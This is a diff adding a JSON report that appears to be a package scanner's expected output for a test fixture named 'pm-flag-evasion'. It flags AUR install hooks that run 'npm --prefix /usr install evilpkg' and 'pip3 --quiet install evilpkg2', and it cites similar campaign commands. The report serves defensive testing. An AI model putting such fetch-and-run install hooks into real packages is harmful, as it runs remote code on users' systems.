@@ -1,0 +1,52 @@
+{
+  "package_name": "nodeprep",
+  "package_version": "1.0.0-1",
+  "findings": [
+    {
+      "id": "INSTALL-004",
+      "severity": "critical",
+      "category": "malicious_code",
+      "title": "Language package manager invoked in install hook (install script)",
+      "description": "An install scriptlet invokes a language package manager to fetch/install packages. Installing a package runs its arbitrary build/lifecycle scripts (preinstall, build.rs, setup.py, go generate, ...) at install time -- a remote code execution vector. The June 2026 Atomic Arch campaign used `npm install` this way (see ATOMIC-002); the same applies to pip, poetry, uv, pdm, cargo, go, gem, composer, conda, deno, and others.",
+      "location": {
+        "file": "tests/fixtures/malicious/pm-flag-evasion/nodeprep.install",
+        "line": 3,
+        "column": 5,
+        "snippet": "    pip3 --quiet install evilpkg2"
+      },
+      "recommendation": "Install hooks must never fetch or install packages. Declare real dependencies in depends/makedepends and handle sources in the source= array; report the package to the AUR maintainers.",
+      "cwe_id": "CWE-494",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "pip3 --quiet install",
+        "script_kind": "install script"
+      }
+    },
+    {
+      "id": "ATOMIC-002",
+      "severity": "critical",
+      "category": "malicious_code",
+      "title": "Node/Bun package manager in install hook (install script)",
+      "description": "Invokes npm/pnpm/yarn/bun (or the npx/bunx runners) to install or run packages from an install hook. The June 2026 'Atomic Arch' campaign added post-install hooks running `npm install atomic-lockfile` / `bun install js-digest`. Legitimate packages never fetch or execute npm/bun packages during the install phase. `npm ci`, `npm rebuild`, `npm exec`, `pnpm dlx`, `yarn dlx`, and the bare `npx <pkg>` / `bunx <pkg>` runners all fetch-and-run lifecycle/remote code just like `install`.",
+      "location": {
+        "file": "tests/fixtures/malicious/pm-flag-evasion/nodeprep.install",
+        "line": 2,
+        "column": 5,
+        "snippet": "    npm --prefix /usr install evilpkg"
+      },
+      "recommendation": "Install scripts must never fetch or install npm/bun packages. Inspect the PKGBUILD diff and report the package to the AUR maintainers.",
+      "cwe_id": "CWE-494",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "npm --prefix /usr install",
+        "script_kind": "install script"
+      }
+    }
+  ],
+  "scanned_files": [
+    "tests/fixtures/malicious/pm-flag-evasion/PKGBUILD",
+    "tests/fixtures/malicious/pm-flag-evasion/nodeprep.install"
+  ],
+  "timestamp": "2026-11-10T14:51:06.146543826Z",
+  "scan_duration_ms": 23
+}
